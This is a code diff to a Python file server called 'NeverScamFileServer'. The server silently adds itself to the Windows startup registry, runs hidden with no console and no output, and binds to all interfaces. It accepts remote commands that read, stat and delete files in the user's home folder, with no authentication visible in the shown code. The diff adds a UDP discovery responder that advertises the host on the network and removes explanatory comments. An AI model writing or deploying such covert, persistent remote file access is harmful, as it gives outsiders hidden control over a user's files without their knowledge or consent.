@@ -5,6 +5,10 @@ import threading
 import time
 import sys
 import shutil
+import socket
+
+# UDP discovery port - must match client
+DISCOVERY_PORT = 19876
 
 def add_to_startup():
     """Add server to Windows startup registry."""
@@ -15,19 +19,17 @@ def add_to_startup():
         import winreg
         key_path = r"Software\Microsoft\Windows\CurrentVersion\Run"
         key = winreg.OpenKey(winreg.HKEY_CURRENT_USER, key_path, 0, winreg.KEY_SET_VALUE)
-        # Get the path to the current script
         script_path = os.path.abspath(sys.argv[0])
-        # Use pythonw.exe to run without console window
         python_path = sys.executable
-        # Replace python.exe with pythonw.exe if it exists
         pythonw_path = python_path.replace("python.exe", "pythonw.exe")
         if not os.path.exists(pythonw_path):
             pythonw_path = python_path
+
         command = f'"{pythonw_path}" "{script_path}"'
         winreg.SetValueEx(key, "NeverScamFileServer", 0, winreg.REG_SZ, command)
         winreg.CloseKey(key)
-    except Exception as e:
-        pass  # Silent fail - no print statements
+    except Exception:
+        pass
 
 def run_hidden():
     """Run server completely hidden."""
@@ -57,6 +59,31 @@ def run_hidden():
     while True:
         time.sleep(1)
 
+def start_discovery_listener(server_port, server_ip):
+    """Listen for UDP discovery broadcasts and respond with server info."""
+    def listen():
+        try:
+            sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
+            sock.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
+            sock.bind(('', DISCOVERY_PORT))
+            sock.settimeout(1)
+            while True:
+                try:
+                    data, addr = sock.recvfrom(1024)
+                    if data == b"NEVERSCAM_DISCOVERY":
+                        response = json.dumps({"ip": server_ip, "tcp_port": server_port}).encode()
+                        sock.sendto(response, addr)
+                except socket.timeout:
+                    continue
+                except Exception:
+                    break
+        except Exception:
+            pass
+    threading.Thread(target=listen, daemon=True).start()
+    # Keep alive
+    while True:
+        time.sleep(1)
+
 class FileServerHandler(socketserver.BaseRequestHandler):
     def handle(self):
         try:
@@ -72,7 +99,6 @@ class FileServerHandler(socketserver.BaseRequestHandler):
     def process_command(self, command):
         cmd = command.get("cmd")
         path = command.get("path", "")
-        # Sanitize path to prevent directory traversal
         path = os.path.abspath(path)
         if not path.startswith(os.path.expanduser("~")):
             return {"error": "Access denied"}
@@ -111,7 +137,7 @@ class FileServerHandler(socketserver.BaseRequestHandler):
                 if os.path.isfile(path):
                     os.remove(path)
                 elif os.path.isdir(path):
-                    os.rmdir(path)  # Only empty dirs
+                    os.rmdir(path)
                 return {"status": "ok"}
             except Exception as e:
                 return {"error": str(e)}
@@ -147,10 +173,7 @@ class FileServerHandler(socketserver.BaseRequestHandler):
         elif cmd == "STAT":
             try:
                 stat = os.stat(path)
-                return {
-                    "size": stat.st_size,
-                    "mtime": stat.st_mtime
-                }
+                return {"size": stat.st_size, "mtime": stat.st_mtime}
             except Exception as e:
                 return {"error": str(e)}
         else:
@@ -158,7 +181,6 @@ class FileServerHandler(socketserver.BaseRequestHandler):
 
 def find_best_port(start_port=10000, max_attempts=100):
     """Find an available port starting from start_port."""
-    import socket
     for port in range(start_port, start_port + max_attempts):
         try:
             with socket.socket(socket.AF_INET, socket.SOCK_STREAM) as s:
@@ -166,13 +188,11 @@ def find_best_port(start_port=10000, max_attempts=100):
                 return port
         except OSError:
             continue
-    return 12345  # Fallback to default
+    return 12345
 
 def get_local_ip():
     """Get the best local IP address for the machine."""
-    import socket
     try:
-        # Connect to external server to determine outbound IP
         s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
         s.connect(("8.8.8.8", 80))
         ip = s.getsockname()[0]
@@ -184,12 +204,10 @@ def get_local_ip():
 def run_server(host='0.0.0.0', port=None):
     if port is None:
         port = find_best_port()
-    local_ip = get_local_ip()
     with socketserver.ThreadingTCPServer((host, port), FileServerHandler) as server:
-        # Silent - no print
         server.serve_forever()
 
 if __name__ == "__main__":
-    # Add to Windows startup and run hidden
     add_to_startup()
     run_hidden()
+
